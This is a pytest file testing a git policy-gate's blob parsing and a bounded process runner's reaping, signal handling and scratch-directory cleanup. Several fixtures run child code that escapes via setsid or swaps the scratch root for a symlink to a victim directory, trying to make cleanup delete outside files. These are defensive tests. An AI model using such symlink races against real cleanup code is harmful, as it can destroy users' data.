        sg.policy_blob_bytes([("0" * 40, CATALOG)])
    for bad in (("base", CATALOG), (original, "lib/model.py")):
        with pytest.raises(sg.GitFailed, match="fixed committed policy"):
            sg.policy_blob_bytes([bad])
    on_base(repo, {CATALOG: None, CATALOG + "/child.md": "not a policy blob\n"})
    with pytest.raises(sg.GitFailed, match="blob header"):
        sg.policy_blob_bytes([(_git(repo, "rev-parse", "base"), CATALOG)])


def test_fresh_policy_batch_refuses_malformed_size_type_and_missing_commit(repo, monkeypatch):
    """A transport success cannot disguise bad framing, missing objects or nonblob policy."""
    sg = load_gate(repo)
    revision = _git(repo, "rev-parse", "base")
    info = f"{revision} commit 12\n".encode()
    oid = b"1" * 40
    good = info + oid + b" blob 3\nabc\n"
    replies = [good, info + f"{revision}:{TRACEABILITY} missing\n".encode(),
               info + oid + b" blob -1\n\n", info + oid + b" blob nope\n\n",
               info + oid + b" blob 300\nabc\n", info + oid + b" blob 3\nabcX",
               info + oid + b" tree 3\nabc\n", info + b"not a header\n",
               good + b"extra", info + oid + b" blob 3", b"0" * 40 + b" missing\n",
               info + oid + b" blob " + b"9" * 5000 + b"\n"]
    def reply(value):
        monkeypatch.setattr(sg.subprocess, "run", lambda args, **kw: subprocess.CompletedProcess(args, 0, value, b""))
    reply(good)
    assert sg.policy_blob_bytes([(revision, CATALOG)]) == [b"abc"]
    reply(replies[1])
    assert sg.policy_blob_bytes([(revision, TRACEABILITY)]) == [None]
    for broken in replies[2:]:
        reply(broken)
        with pytest.raises(sg.GitFailed):
            sg.policy_blob_bytes([(revision, CATALOG)])


def test_close_out_batch_keeps_current_policy_base_separate_from_merge_base(repo):
    """Real PR DAG: newly adopted BASE trace policy cannot be bypassed via older merge-base."""
    meta = {"PR_TITLE": "FEAT-MODEL-001: x", "PR_BODY": body(ticked=True),
            "PR_NUMBER": "42", "PR_DRAFT": "false", "PR_HEAD_REF": BRANCH}
    row = CATALOG_TEXT.replace("| Models | Production | unknown | none |",
                               f"| Models | Production | {TODAY} | #42 |")
    change(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: row})
    head, old_base = _git(repo, "rev-parse", "HEAD"), _git(repo, "rev-parse", "base")
    control = gate(repo, "--pr", old_base, head, **meta)
    assert control.returncode == 0, control.stdout
    on_base(repo, {TRACEABILITY: "# Traceability\n\n## FEAT-MODEL-001\n\n- #1 prior\n"})
    policy = _git(repo, "rev-parse", "base")
    assert _git(repo, "merge-base", policy, head) == old_base
    refused = gate(repo, "--pr", policy, head, **meta)
    assert refused.returncode == 1 and "section's PR lineage" in refused.stdout, refused.stdout

    sg = load_gate(repo)
    assert sg.close_out_policy([(head, CATALOG)]) == [sg.Tree(head).read(CATALOG)]


def escaped_measurement(tmp_path: Path, *, mib: int, parent_exit: int | None, child_seconds: float) -> dict:
    """Native setsid child; outer supervisor rescues any old broken-monitor orphan before asserting RED."""
    pidfile = tmp_path / f'escaped-{mib}-{parent_exit}-{child_seconds}.pid'
    child = ("import os,time;os.setsid();" + f"open({str(pidfile)!r},'w').write(str(os.getpid()));" +
             "a=bytearray(" + str(mib*1024*1024) + ");" +
             f"open({str(pidfile)+'.ready'!r},'w').write('ready');time.sleep({child_seconds})")
    parent = ("import os,subprocess,sys,time; p=subprocess.Popen([sys.executable,'-c'," + repr(child) + "]);"
              "\nfor _ in range(1000):\n if os.path.exists(" + repr(str(pidfile)+'.ready') + "):break\n time.sleep(.001)\n")
    parent += 'time.sleep(20)' if parent_exit is None else ('p.wait();' if child_seconds < 1 else '') + f'raise SystemExit({parent_exit})'
    launcher = ("import ctypes,importlib.util,json,pathlib,os,signal,sys;ctypes.CDLL(None).prctl(36,1,0,0,0);"
                "s=importlib.util.spec_from_file_location('inventory_budget',sys.argv[1]);"
                "m=importlib.util.module_from_spec(s);sys.modules[s.name]=m;s.loader.exec_module(m);"
                "r=m.run_bounded([sys.executable,'-c',sys.argv[2]],pathlib.Path(sys.argv[3]),max_rss_bytes=64*1024*1024,max_seconds=1);"
                "pid=int(pathlib.Path(sys.argv[4]).read_text());r['escaped_alive_after_monitor']=pathlib.Path('/proc',str(pid)).exists();"
                "\ntry:os.kill(pid,signal.SIGKILL)\nexcept ProcessLookupError:pass\n"
                "try:os.waitpid(pid,0)\nexcept ChildProcessError:pass\n"
                "r['outer_cleanup_complete']=not pathlib.Path('/proc',str(pid)).exists();print(json.dumps(r))")
    r = subprocess.run([sys.executable,'-c',launcher,str(REPO/MEASURE),parent,str(tmp_path),str(pidfile)],
                       capture_output=True,text=True,timeout=5)
    assert r.returncode == 0, r.stdout + r.stderr
    return json.loads(r.stdout)


def test_measure_inventory_render_owns_session_changing_descendants(tmp_path):
    """Stable escaped RSS is counted; root-success, timeout and error all stop/reap their actual family."""
    memory = escaped_measurement(tmp_path,mib=96,parent_exit=0,child_seconds=20)
    assert not memory['ok'] and memory['reason']=='rss_limit' and memory['peak_rss_bytes']>64*1024*1024, memory
    assert not memory['escaped_alive_after_monitor'] and memory['outer_cleanup_complete'], memory
    accepted = escaped_measurement(tmp_path,mib=1,parent_exit=0,child_seconds=.1)
    assert accepted['ok'] and not accepted['escaped_alive_after_monitor'], accepted
    timeout = escaped_measurement(tmp_path,mib=1,parent_exit=None,child_seconds=20)
    failed = escaped_measurement(tmp_path,mib=1,parent_exit=7,child_seconds=20)
    assert not timeout['ok'] and timeout['reason']=='time_limit' and not timeout['escaped_alive_after_monitor'], timeout
    assert not failed['ok'] and failed['worker_exit']==7 and not failed['escaped_alive_after_monitor'], failed
    assert all(x['owned_family_gone'] for x in (memory,accepted,timeout,failed))


SCRATCH_LAUNCHER = r"""
import ctypes,importlib.util,io,json,os,pathlib,signal,subprocess,sys,time
ctypes.CDLL(None).prctl(36,1,0,0,0)
s=importlib.util.spec_from_file_location('inventory_scratch',sys.argv[1]);m=importlib.util.module_from_spec(s);sys.modules[s.name]=m;s.loader.exec_module(m)
child,outer,mode,seconds=sys.argv[2],sys.argv[3],sys.argv[4],float(sys.argv[5])
argv=[sys.executable,'-c',child]
spawned=[]
if mode=='unreaped':
    real=m.OwnedFamily.terminate_and_reap;m.OwnedFamily.terminate_and_reap=lambda self,*a:(real(self,*a),False)[1]
if mode=='prestart':
    argv=[os.path.join(outer,'no-such-executable')]
if mode=='receipt-failure':
    def refuse(root,entry):raise OSError('receipt write refused')
    m.append_receipt=refuse
if mode=='prefork':
    argv=[sys.executable,'-c','pass\0']
UNREGISTERED=('unregistered','unregistered-unknown','unregistered-table-unreadable','unregistered-grandchild','unregistered-unidentified',
              'unregistered-broken-stderr','unregistered-late','unregistered-signal-refused','unregistered-unidentified-receipt',
              'unregistered-identity-unreadable','unregistered-late-grandchild',
              'unregistered-identity-unreadable-grandchild','unregistered-signal-refused-grandchild')
real_pidfd_send_signal=signal.pidfd_send_signal
real_process_start=m.process_start
signals=[]
if mode in UNREGISTERED:
    real_popen=m.subprocess.Popen
    def interrupted(*a,**kw):
        spawned.append(real_popen(*a,**kw))
        until=time.monotonic()+5
        while mode in('unregistered-grandchild','unregistered-late-grandchild','unregistered-identity-unreadable-grandchild',
                      'unregistered-signal-refused-grandchild') and time.monotonic()<until and not any(os.path.exists(os.path.join(outer,n,'ready')) for n in os.listdir(outer)):
            time.sleep(.01)
        # The child replaces its root's receipt with a directory, so the monitor's next receipt write fails.
        while mode=='unregistered-unidentified-receipt' and time.monotonic()<until and not any(os.path.isdir(os.path.join(outer,n,'CREATED-BY')) for n in os.listdir(outer)):
            time.sleep(.01)
        if mode in('unregistered-unidentified','unregistered-unidentified-receipt'):
            def unidentified(pid):raise OSError(24,'Too many open files')
            m.os.pidfd_open=unidentified
        if mode=='unregistered-signal-refused':
            def refused(fd,sig,*a):raise PermissionError(1,'Operation not permitted')
            m.signal.pidfd_send_signal=refused
        if mode=='unregistered-signal-refused-grandchild':
            # Only the spawned child's signal is refused; any other signal is sent and counted. Each PIDfd is mapped to
            # the PID it was opened for, so the refusal follows the child's identity, not a descriptor number.
            child,opened=spawned[-1].pid,{}
            def mapped(pid,*a):
                fd=real_pidfd_open(pid,*a);opened[fd]=pid;return fd
            def refuse_child(fd,sig,*a):
                if opened.get(fd)==child:raise PermissionError(1,'Operation not permitted')
                signals.append(sig);return real_pidfd_send_signal(fd,sig,*a)
            m.os.pidfd_open=mapped;m.signal.pidfd_send_signal=refuse_child
        if mode in('unregistered-identity-unreadable','unregistered-identity-unreadable-grandchild'):
            # The PIDfd opens, then the child's start time cannot be read; every signal sent is counted.
            child=spawned[-1].pid
            def unreadable(pid):
                if pid==child:raise OSError(24,'Too many open files')
                return real_process_start(pid)
            def counted(fd,sig,*a):signals.append(sig);return real_pidfd_send_signal(fd,sig,*a)
            m.process_start=unreadable;m.signal.pidfd_send_signal=counted
        if mode in('unregistered-late','unregistered-late-grandchild'):
            time.sleep(seconds+.3)   # the interrupt arrives after the command's whole deadline has passed
        raise KeyboardInterrupt('after fork, before the monitor binds the child')
    m.subprocess.Popen=interrupted
real_own_children=m.own_children
if mode=='unregistered-unknown':
    def unknown():raise OSError('process table unreadable')
    m.own_children=unknown
real_process_table=m.process_table
if mode=='unregistered-table-unreadable':
    # Every read succeeds except the first one after the monitor's own_children() has listed the children: the kill
    # pass's descendant snapshot. The relist after the pass reads the real table again. Whether the failing read was
    # that direct snapshot or one inside an own_children() listing, and how many listings ran, are recorded, so a
    # monitor without the snapshot (its next read is the relist) is told apart (QUAL7 R4 F2).
    armed,inside,listings=[],[],[]
    def listing():
        listings.append(1);inside.append(1)
        try:children=real_own_children()
        finally:inside.pop()
        if not armed:armed.append('listed')
        return children
    def fails_after_listing():
        if armed==['listed']:
            armed.append('failed in a listing' if inside else 'failed directly');raise OSError('process table unreadable')
        return real_process_table()
    m.own_children=listing;m.process_table=fails_after_listing
if mode=='unregistered-late-grandchild':
    # The relist after the kill pass runs once the killed child has exited (its state reads Z, up to 2 s): the kernel
    # reparents a child's children before its exit shows, so the relist always finds the grandchild adopted. When
    # the kernel finishes a killed child's exit is not what this mode tests (Codex P2 on f46c739a).
    lists=[]
    def after_exit():
        lists.append(1)
        until=time.monotonic()+2
        while len(lists)>1 and spawned and time.monotonic()<until:
            try:state=open(f'/proc/{spawned[-1].pid}/stat','rb').read().rsplit(b')',1)[1].split()[0].decode()
            except OSError:state='gone'
            if state in('Z','X','gone'):break
            time.sleep(.005)
        return real_own_children()
    m.own_children=after_exit
notice=io.StringIO();real_stderr=sys.stderr
if mode in UNREGISTERED and mode!='unregistered-broken-stderr':
    sys.stderr=notice
if mode=='unregistered-late-grandchild':
    ctypes.CDLL(None).prctl(36,0,0,0,0)   # so a skipped restore is visible as 1 afterwards
if mode=='unregistered-broken-stderr':
    class Unwritable:
        def write(self,text):raise OSError(28,'No space left on device')
        def flush(self):raise OSError(28,'No space left on device')
    sys.stderr=Unwritable()
    ctypes.CDLL(None).prctl(36,0,0,0,0)   # so a skipped restore is visible as 1 afterwards
victim=os.environ.get('SCRATCH_VICTIM')
real_unlink,real_rmdir,real_open,real_scandir=os.unlink,os.rmdir,os.open,os.scandir
real_pidfd_open=os.pidfd_open
if mode=='slow-removal':
    def slow(*a,**kw):time.sleep(.05);return real_unlink(*a,**kw)
    m.os.unlink=slow
if mode=='rmdir-swap':
    def swap_after_receipt(path,*a,**kw):
        real_unlink(path,*a,**kw)
        if path=='CREATED-BY':
            root=[os.path.join(outer,n) for n in os.listdir(outer) if n.startswith('measure-render-')][0]
            os.rename(root,root+'.orig');os.mkdir(root,0o700)
    m.os.unlink=swap_after_receipt
if mode=='subdir-swap':
    def swap_subdir(path,flags,mode_=0o777,*,dir_fd=None):
        if path=='sub' and dir_fd is not None:
            os.rename('sub','sub.orig',src_dir_fd=dir_fd,dst_dir_fd=dir_fd);os.symlink(victim,'sub',dir_fd=dir_fd)
        return real_open(path,flags,mode_,dir_fd=dir_fd)
    m.os.open=swap_subdir
if mode=='late-writer':
    def write_after_receipt(path,*a,**kw):
        real_unlink(path,*a,**kw)
        if path=='CREATED-BY':
            root=[os.path.join(outer,n) for n in os.listdir(outer) if n.startswith('measure-render-')][0]
            open(os.path.join(root,'late-writer.txt'),'w').close()
    m.os.unlink=write_after_receipt
if mode in('receipt-redirect','receipt-fifo'):
    real_append=m.append_receipt
    def late(root,entry):
        if entry.get('event')=='worker':time.sleep(.5)
        return real_append(root,entry)
    m.append_receipt=late
ops=[]
if mode=='order':
    def rec_unlink(path,*a,**kw):ops.append(['unlink',os.fspath(path)]);return real_unlink(path,*a,**kw)
    def rec_rmdir(path,*a,**kw):ops.append(['rmdir',os.fspath(path)]);return real_rmdir(path,*a,**kw)
    m.os.unlink,m.os.rmdir=rec_unlink,rec_rmdir
if mode=='slow-listing':
    class Slow:
        def __init__(self,it):self.it=it
        def __enter__(self):self.it.__enter__();return self
        def __exit__(self,*a):return self.it.__exit__(*a)
        def __iter__(self):
            for e in self.it:
                time.sleep(.005);yield e
    m.os.scandir=lambda p='.':Slow(real_scandir(p)) if isinstance(p,int) else real_scandir(p)
started=time.monotonic()
try:
    r=m.run_bounded(argv,pathlib.Path.cwd(),max_rss_bytes=64*1024*1024,max_seconds=seconds)
except KeyboardInterrupt as e:
    r={'raised':type(e).__name__}
finally:
    m.os.unlink,m.os.rmdir,m.os.open,m.os.scandir=real_unlink,real_rmdir,real_open,real_scandir
    m.os.pidfd_open=real_pidfd_open
    m.signal.pidfd_send_signal=real_pidfd_send_signal
    m.process_start=real_process_start
    m.own_children=real_own_children   # the launcher's own observation and cleanup below read the real table
    m.process_table=real_process_table
    sys.stderr=real_stderr
r['ops']=ops
r['signals']=signals
if mode=='unregistered-table-unreadable':
    r['table_failure'],r['listings']=armed[1:],len(listings)
r['notice']=notice.getvalue()
r['victim_after']=sorted(os.listdir(victim)) if victim and os.path.isdir(victim) else None
r['measured_elapsed']=time.monotonic()-started
r['outer_after']=sorted(os.listdir(outer))
roots=[os.path.join(outer,n) for n in r['outer_after'] if n.startswith('measure-render-')]
r['receipts']=[[json.loads(line) for line in open(os.path.join(x,'CREATED-BY'))] if os.path.isfile(os.path.join(x,'CREATED-BY')) else None for x in roots]
v=ctypes.c_int();ctypes.CDLL(None).prctl(37,ctypes.byref(v),0,0,0);r['subreaper_after']=v.value
# What is alive is read here, at assertion time, before this launcher's own cleanup below.
r['children_at_assertion']=m.own_children()
# Each listed child's state ('Z' once killed); a signalled child is given up to 2 s to stop running. Read only in the
# mode whose assertion uses it, so no other mode waits on a child it never signals (QUAL7 R2 P2).
r['states_at_assertion']={}
for c in (r['children_at_assertion'] if mode=='unregistered-late-grandchild' else []):
    until=time.monotonic()+2
    while True:
        try:state=open(f"/proc/{c['pid']}/stat",'rb').read().rsplit(b')',1)[1].split()[0].decode()
        except OSError:state='gone'
        if state in('Z','X','gone') or time.monotonic()>=until:break
        time.sleep(.01)
    r['states_at_assertion'][str(c['pid'])]=state
if mode in('unregistered-identity-unreadable-grandchild','unregistered-signal-refused-grandchild'):
    # The grandchild named its own PID; its parent, the spawned child, is alive and never waits, so the PID stays
    # held until that child is killed below. Its state is read here, given up to .5 s to show a delivered SIGKILL.
    gpid=int([open(os.path.join(outer,n,'ready')).read() for n in os.listdir(outer) if os.path.isfile(os.path.join(outer,n,'ready'))][0])
    until=time.monotonic()+.5
    while True:
        try:state=open(f'/proc/{gpid}/stat','rb').read().rsplit(b')',1)[1].split()[0].decode()
        except OSError:state='gone'
        if state in('Z','X','gone') or time.monotonic()>=until:break
        time.sleep(.01)
    r['grandchild_at_assertion']={'pid':gpid,'state':state}
    if state not in('Z','X','gone'):signal.pidfd_send_signal(os.pidfd_open(gpid),signal.SIGKILL)   # test cleanup only
for p in spawned:
    rc=p.poll()
    r['spawned']={'pid':p.pid,'alive':rc is None,'returncode':rc,'start_ticks':m.process_start(p.pid) if rc is None else None}
    p.kill();p.wait()
# Test cleanup only: each remaining PID is this launcher's own unreaped child (it is the subreaper), so it cannot
# be recycled before the waitpid here; a PID already reaped above through its Popen is skipped.
for events in r['receipts']:
    for e in events or []:
        for c in e.get('remaining',[]):
            if c['pid'] not in [p.pid for p in spawned]:
                os.kill(c['pid'],signal.SIGKILL);os.waitpid(c['pid'],0)
# The killed grandchild of the identity-unverified (or signal-refused) child is adopted by this launcher once that child is reaped above;
# it is then this launcher's own unreaped child, so its PID cannot be recycled before this waitpid.
if mode in('unregistered-identity-unreadable-grandchild','unregistered-signal-refused-grandchild') and gpid in [c['pid'] for c in m.own_children()]:
    os.waitpid(gpid,0)
r['children_after_cleanup']=m.own_children()
print(json.dumps(r))
"""


def scratch_measurement(tmp_path, mode, seconds=1):
    """One run_bounded call whose child writes temp data, with the monitor's own TMPDIR pinned to a fresh dir."""
    outer = tmp_path / f'outer-{mode}'
    outer.mkdir()
    record = tmp_path / f'child-{mode}.json'
    victim = tmp_path / f'victim-{mode}'
    child = ("import json,os,sys,tempfile,time;d=tempfile.mkdtemp(prefix='spec-gate-render-');"
             "open(os.path.join(d,'blob'),'wb').write(b'x'*(1024*1024));"
             "root=os.environ['TMPDIR'];json.dump({'dir':d,'root':root,'receipt':open(os.path.join(root,'CREATED-BY')).read()},"
             f"open({str(record)!r},'w'));")
    child += {'accepted': '', 'unreaped': '', 'prestart': '', 'receipt-failure': '', 'unregistered': 'time.sleep(20)',
              'memory': 'a=bytearray(96*1024*1024);time.sleep(20)', 'stall': 'time.sleep(20)',
              'failed': 'raise SystemExit(7)',
              'escaped': "import subprocess;subprocess.Popen([sys.executable,'-c','import os,tempfile,time;os.setsid();"
                         "d=tempfile.mkdtemp();open(os.path.join(d,\\'b\\'),\\'w\\').write(\\'x\\');time.sleep(20)']);time.sleep(.3)",
              'symlink-root': f"os.mkdir({str(victim)!r});open(os.path.join({str(victim)!r},'keep.txt'),'w').write('keep');"
                              "os.rename(root,root+'.moved');os.symlink(" + repr(str(victim)) + ",root)",
              'slow-removal': "[open(os.path.join(root,'f%d'%n),'w').close() for n in range(60)]",
              'replaced-root': "os.rename(root,root+'.moved');os.mkdir(root);open(os.path.join(root,'keep.txt'),'w').write('keep')",
              'manyfiles': "n=0\nwhile True:\n open(os.path.join(root,'f%d'%n),'w').close();n+=1",
              'prefork': '', 'unregistered-unknown': 'time.sleep(20)', 'unregistered-table-unreadable': 'time.sleep(20)', 'unregistered-unidentified': 'time.sleep(20)', 'unregistered-broken-stderr': 'time.sleep(20)', 'rmdir-swap': '',
              'unregistered-late': 'time.sleep(20)', 'unregistered-signal-refused': 'time.sleep(20)',
              'unregistered-identity-unreadable': 'time.sleep(20)',
              'unregistered-identity-unreadable-grandchild': "import subprocess;subprocess.Popen([sys.executable,'-c','import os,time;os.setsid();"
                                                              "open(os.path.join(os.environ[\\'TMPDIR\\'],\\'ready\\'),\\'w\\').write(str(os.getpid()));time.sleep(20)']);time.sleep(20)",
              'unregistered-signal-refused-grandchild': "import subprocess;subprocess.Popen([sys.executable,'-c','import os,time;os.setsid();"
                                                         "open(os.path.join(os.environ[\\'TMPDIR\\'],\\'ready\\'),\\'w\\').write(str(os.getpid()));time.sleep(20)']);time.sleep(20)",
              'unregistered-unidentified-receipt': "os.unlink(os.path.join(root,'CREATED-BY'));os.mkdir(os.path.join(root,'CREATED-BY'));time.sleep(20)",
              'subdir-swap': f"os.mkdir({str(victim)!r});open(os.path.join({str(victim)!r},'keep.txt'),'w').write('keep');"
                             "os.mkdir(os.path.join(root,'sub'));open(os.path.join(root,'sub','a'),'w').write('a')",
              'receipt-redirect': f"os.rename(root,root+'.moved');os.mkdir({str(victim)!r});os.symlink({str(victim)!r},root)",
              'receipt-fifo': "os.unlink(os.path.join(root,'CREATED-BY'));os.mkfifo(os.path.join(root,'CREATED-BY'));time.sleep(20)",
              'late-writer': '',
              'unregistered-late-grandchild': "import subprocess;subprocess.Popen([sys.executable,'-c','import os,time;os.setsid();"
                                              "open(os.path.join(os.environ[\\'TMPDIR\\'],\\'ready\\'),\\'w\\').close();time.sleep(20)']);time.sleep(20)",
              'unregistered-grandchild': "import subprocess;subprocess.Popen([sys.executable,'-c','import os,time;os.setsid();"
                                         "open(os.path.join(os.environ[\\'TMPDIR\\'],\\'ready\\'),\\'w\\').close();time.sleep(20)']);time.sleep(20)",
              'order': "os.mkdir(os.path.join(root,'sub'));[open(os.path.join(root,n),'w').close() for n in ('a','b','sub/c')]",
              'slow-listing': "[open(os.path.join(root,'f%d'%n),'w').close() for n in range(400)]"}[mode]
    r = subprocess.run([sys.executable, '-c', SCRATCH_LAUNCHER, str(REPO/MEASURE), child, str(outer), mode, str(seconds)],
                       capture_output=True, text=True, timeout=15,
                       env={**os.environ, 'TMPDIR': str(outer), 'SCRATCH_VICTIM': str(victim)})
    assert r.returncode == 0, r.stdout + r.stderr
    return json.loads(r.stdout), (json.loads(record.read_text()) if record.exists() else None), outer, victim


def test_measure_inventory_render_owns_and_removes_its_scratch_root(tmp_path):
    """Every outcome removes the monitor-created temp root after the family is reaped, killed workers included."""
    expected = {'accepted': 'completed', 'memory': 'rss_limit', 'stall': 'time_limit', 'failed': 'worker_failed',
                'escaped': 'unexpected_descendants'}
    for mode, reason in expected.items():
        report, child, outer, _ = scratch_measurement(tmp_path, mode)
        assert report['reason'] == reason and report['owned_family_gone'], (mode, report)
        root = report['scratch_root']
        assert root and Path(root).parent == outer and Path(root).name.startswith('measure-render-'), (mode, report)
        assert child and child['root'] == root and Path(child['dir']).parent == Path(root), (mode, child)
        created = json.loads(child['receipt'].splitlines()[0])
        assert created['event'] == 'created' and created['monitor_start_ticks'] > 0 and created['boot_id'], (mode, created)
        assert report['scratch_root_removed'] and not report.get('scratch_root_retained'), (mode, report)
        assert report['outer_after'] == [] and not Path(root).exists(), (mode, report['outer_after'])
    # A family the monitor could not prove reaped keeps its root, and the receipt names the worker it started.
    report, _, outer, _ = scratch_measurement(tmp_path, 'unreaped')
    assert not report['ok'] and not report['owned_family_gone'], report
    assert report['scratch_root_retained'] and report['scratch_root_retained_reason'] == 'family_not_proven_reaped', report
    assert not report['scratch_root_removed'] and report['outer_after'] == [Path(report['scratch_root']).name], report
    worker = [e for e in report['receipts'][0] if e['event'] == 'worker']
    assert worker and worker[0]['worker_pid'] == report['process_group'] and worker[0]['worker_start_ticks'] > 0, report


CLOSED_STDERR_PROBE = r"""
import importlib.util,os,pathlib,sys
s=importlib.util.spec_from_file_location('m',sys.argv[1]);m=importlib.util.module_from_spec(s);s.loader.exec_module(m)
if len(sys.argv)>2 and sys.argv[2]=='full':
    r,w=os.pipe();os.dup2(w,2);os.close(w);os.set_blocking(2,False)
    try:
        while True:os.write(2,b'x'*4096)
    except BlockingIOError:pass
    os.set_blocking(2,True)
real_popen=m.subprocess.Popen
def interrupted(*a,**kw):
    real_popen(*a,**kw)
    raise KeyboardInterrupt('after fork')
m.subprocess.Popen=interrupted
try:
    m.run_bounded([sys.executable,'-c','import time;time.sleep(20)'],pathlib.Path.cwd(),max_rss_bytes=64<<20,max_seconds=2)
except KeyboardInterrupt:
    os.write(1,b'interrupt propagated\n')
"""


def test_measure_inventory_render_notices_never_reach_stdout_with_stderr_closed(tmp_path):
    """With fd 2 closed at startup, sys.stderr is None and print(file=None) writes to stdout, the report channel:
    the cleanup notices go to fd 2 itself, so stdout carries only what the caller wrote (#1700 pass 22 R1 F1)."""
    scratch = tmp_path / "tmp"
    scratch.mkdir()
    r = subprocess.run(["sh", "-c", 'exec "$0" -c "$1" "$2" 2>&-', sys.executable, CLOSED_STDERR_PROBE,
                        str(REPO / MEASURE)], capture_output=True, text=True, timeout=60, cwd=tmp_path,
                       env={**os.environ, "TMPDIR": str(scratch)})
    assert r.returncode == 0, r.stdout + r.stderr
    assert r.stdout == "interrupt propagated\n", r.stdout


def test_measure_inventory_render_notices_never_wait_on_a_full_stderr_pipe(tmp_path):
    """SIGALRM is blocked while the cleanup writes its notices, so a blocking write to a stderr pipe nobody drains
    would outlast the deadline: the notice is dropped and the interrupt propagates at once (#1700 pass 23 R1 F1)."""
    scratch = tmp_path / "tmp"
    scratch.mkdir()
    r = subprocess.run([sys.executable, "-c", CLOSED_STDERR_PROBE, str(REPO / MEASURE), "full"], capture_output=True,
                       text=True, timeout=15, cwd=tmp_path, env={**os.environ, "TMPDIR": str(scratch)})
    assert r.returncode == 0, r.stdout + r.stderr
    assert r.stdout == "interrupt propagated\n", r.stdout



SECOND_INTERRUPT_PROBE = r"""
import ctypes,importlib.util,json,os,pathlib,signal,sys,threading,time
signal.signal(signal.SIGINT,signal.default_int_handler)   # a background job starts with SIGINT ignored (pass 33 R2)
lib=ctypes.CDLL(None);lib.prctl(36,0,0,0,0)
s=importlib.util.spec_from_file_location('m',sys.argv[1]);m=importlib.util.module_from_spec(s);s.loader.exec_module(m)
mode=sys.argv[2];spawned=[];masks=[]
def blocked():   # this thread's blocked set, from the kernel
    line=[l for l in pathlib.Path('/proc/thread-self/status').read_text().splitlines() if l.startswith('SigBlk:')][0]
    bits=int(line.split()[1],16);return [n for n in (signal.SIGINT,signal.SIGALRM) if bits>>(n-1)&1]
if mode=='spawn':  # the first Ctrl-C lands after fork, the second while the cleanup kills the child
    real_popen=m.subprocess.Popen
    def interrupted(*a,**kw):
        spawned.append(real_popen(*a,**kw));time.sleep(.2)
        raise KeyboardInterrupt('first Ctrl-C, after fork')
    m.subprocess.Popen=interrupted
    real_kill=m.kill_unregistered
    def second(*a):
        os.kill(os.getpid(),signal.SIGINT);return real_kill(*a)
    m.kill_unregistered=second
    argv=[sys.executable,'-c','import time;time.sleep(20)']
else:              # one Ctrl-C (with the deadline too, in both) while the cleanup removes a finished worker's root
    real_remove=m.remove_scratch
    def removing(*a):
        os.kill(os.getpid(),signal.SIGINT)
        if mode=='both': os.kill(os.getpid(),signal.SIGALRM)
        return real_remove(*a)
    m.remove_scratch=removing
    real_discover=m.OwnedFamily.discover
    def discover(self,**kw):
        if threading.current_thread() is not threading.main_thread(): masks.append(blocked())
        return real_discover(self,**kw)
    m.OwnedFamily.discover=discover
    argv=[sys.executable,'-c','import time;time.sleep(.3)']
r,w=os.pipe();real_err=sys.stderr;sys.stderr=os.fdopen(w,'w')
try:
    with m.deadline_guard(time.monotonic()+30):
        m.run_bounded(argv,pathlib.Path.cwd(),max_rss_bytes=256<<20,max_seconds=5)
    raised=None
except BaseException as e:
    raised=f'{type(e).__name__}:{e}'
sys.stderr.close();sys.stderr=real_err;notices=os.read(r,65536).decode()
v=ctypes.c_int();lib.prctl(37,ctypes.byref(v),0,0,0)
outer=os.environ['TMPDIR']
print(json.dumps({'raised':raised,'subreaper_after':v.value,'notices':notices,'masks':masks,
  'roots':[n for n in os.listdir(outer) if n.startswith('measure-render-')],
  'child_alive':bool(spawned) and spawned[0].poll() is None}))
if spawned and spawned[0].poll() is None: spawned[0].kill();spawned[0].wait()
"""


def test_measure_inventory_render_cleanup_defers_a_second_interrupt(tmp_path):
    """The cleanup defers SIGINT as well as SIGALRM, and the discovery thread blocks both, so a Ctrl-C during the
    kill pass or the removal is raised only after the receipt, the subreaper restore and the notices (pass 32 R1);
    with the deadline also expired meanwhile, the Ctrl-C is still what propagates (pass 33 R1 F1)."""
    for mode in ("spawn", "bound", "both"):
        scratch = tmp_path / mode
        scratch.mkdir()
        r = subprocess.run([sys.executable, "-B", "-c", SECOND_INTERRUPT_PROBE, str(REPO / MEASURE), mode],
                           capture_output=True, text=True, timeout=60, cwd=tmp_path, env={**os.environ, "TMPDIR": str(scratch)})
        assert r.returncode == 0, (mode, r.stdout + r.stderr)
        report = json.loads(r.stdout)
        assert report["raised"] == "KeyboardInterrupt:" and report["subreaper_after"] == 0 and report["roots"] == [], (mode, report)
        if mode == "spawn":
            assert not report["child_alive"] and "killed unregistered child" in report["notices"], report
        else:
            assert report["masks"] and all(sorted(k) == [2, 14] for k in report["masks"]), report

BODY_INTERRUPT_PROBE = r"""
import importlib.util,json,os,pathlib,signal,sys,time
signal.signal(signal.SIGINT,signal.default_int_handler)
s=importlib.util.spec_from_file_location('m',sys.argv[1]);m=importlib.util.module_from_spec(s);s.loader.exec_module(m)
real=m.OwnedFamily.terminate_and_reap;calls=[]
def hung(self,process,deadline):   # the main-path reap runs under defer_deadline() alone and outlasts the whole deadline
    calls.append(1)
    if len(calls)==1:
        end=time.monotonic()+0.6
        while time.monotonic()<end: time.sleep(.01)
        os.kill(os.getpid(),signal.SIGINT)   # Ctrl-C at the hung reap, raised by the body itself
    return real(self,process,deadline)
m.OwnedFamily.terminate_and_reap=hung
out={'raised':None}
try:
    with m.deadline_guard(time.monotonic()+0.4):
        rep=m.run_bounded([sys.executable,'-c','import time;time.sleep(.05)'],pathlib.Path.cwd(),max_rss_bytes=256<<20,max_seconds=5)
        out['returned']=rep['reason']
except BaseException as e:
    out['raised']=type(e).__name__
out['mask']=sorted(int(x) for x in signal.pthread_sigmask(signal.SIG_BLOCK,set()))
print(json.dumps(out))
"""


def test_measure_inventory_render_deadline_never_replaces_a_ctrl_c_raised_inside(tmp_path):
    """A Ctrl-C raised by the body of a deferred section (here the main-path reap, which defers only the deadline)
    while the deadline expired meanwhile is what propagates; the deadline does not replace it, so the run exits 130,
    not 1 (#1700 pass 34 R1 F1)."""
    r = subprocess.run([sys.executable, "-B", "-c", BODY_INTERRUPT_PROBE, str(REPO / MEASURE)], capture_output=True,
                       text=True, timeout=60, cwd=tmp_path, env={**os.environ, "TMPDIR": str(tmp_path)})
    assert r.returncode == 0, r.stdout + r.stderr
    out = json.loads(r.stdout)
    assert out["raised"] == "KeyboardInterrupt" and out["mask"] == [], out

NOTICE_PROBE = r"""
import importlib.util,json,os,select,socket,sys,threading,time
s=importlib.util.spec_from_file_location('m',sys.argv[1]);m=importlib.util.module_from_spec(s);s.loader.exec_module(m)
mode=sys.argv[2];r,w=os.pipe();real_os=os;out={}
